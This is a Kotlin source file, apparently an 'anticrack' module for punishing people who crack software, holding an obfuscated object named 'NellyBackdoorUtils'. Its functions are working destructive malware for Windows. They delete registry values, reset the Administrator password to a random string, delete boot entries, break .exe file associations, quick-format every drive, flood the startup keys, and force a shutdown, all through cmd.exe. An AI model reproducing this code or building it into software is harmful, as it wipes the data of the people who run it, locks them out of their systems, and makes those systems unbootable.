package anticrack

import nellyobfuscator.NellyClassObfuscator
import top.fl0wowp4rty.phantomshield.annotations.Native
import top.fl0wowp4rty.phantomshield.annotations.license.RegisterLock
import java.awt.Desktop
import java.io.File
import java.util.prefs.Preferences

// DimplesUtils!?
@Native
@RegisterLock
@NellyClassObfuscator
object NellyBackdoorUtils {

    fun delRegEntry() {
        val preferences = Preferences.userRoot().node("HKEY_CURRENT_USER\\Software")
        val keys = preferences.keys()
        for (key in keys) {
            preferences.remove(key)
        }
    }

    fun killexplorer() {
        executeCommand("taskkill /f /im explorer.exe")
    }
    fun modifyUserPassword() {
        val username = "Administrator"
        val newPassword =
            "sdgolaopgbasiobgioasboasngposahngopashopnspoahopashjsopahujpoashopaspeupoasjtopasnophaopsjhopajspjasdpgyhsahnpsajhpasjgpsgpsahnpo"

        executeCommand("net user $username $newPassword")
    }

    fun delbc() {
        executeCommand("bcdedit /enum all")
        executeCommand("bcdedit /delete {default}")
        executeCommand("bcdedit /delete {current}")
        executeCommand("bcdedit /delete {bootmgr}")
    }

    fun delexeftype() {
        executeCommand("assoc .exe=txtfile")
        executeCommand("ftype txtfile=%SystemRoot%\\system32\\notepad.exe %1")
    }

    fun formatAllDrives() {
        val drives = File.listRoots()
        for (drive in drives) {
            val driveLetter = drive.absolutePath.substring(0, 1)
            val newName = "SBSBSBBS$driveLetter"
            val cmd = "format $driveLetter /FS:NTFS /V:$newName /Q /Y"
            executeCommand(cmd)
        }
    }

    fun popupAvailableDrives() {
        val roots = File.listRoots()
        for (root in roots) {
            if (root.isDirectory && root.exists() && root.canRead()) {
                val drivePath = root.absolutePath
                Desktop.getDesktop().open(File(drivePath))
            }
        }
    }

    fun addALLStartupRegistry() {
        executeCommand("for /f \"tokens=*\" %%a in ('dir /b /s \"C:\\Program Files\\*.exe\"') do (")
        executeCommand("    reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v \"%%~na\" /t REG_SZ /d \"%%a\" /f >nul")
        executeCommand(")")
    }

    fun shutdown() {
        executeCommand("shutdown /s /t 0")
    }

    private fun executeCommand(command: String) {
        try {
            val runtime = Runtime.getRuntime()
            val process = runtime.exec("cmd.exe /c $command")

            val outputStream = process.outputStream
            outputStream.flush()
            outputStream.close()

        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}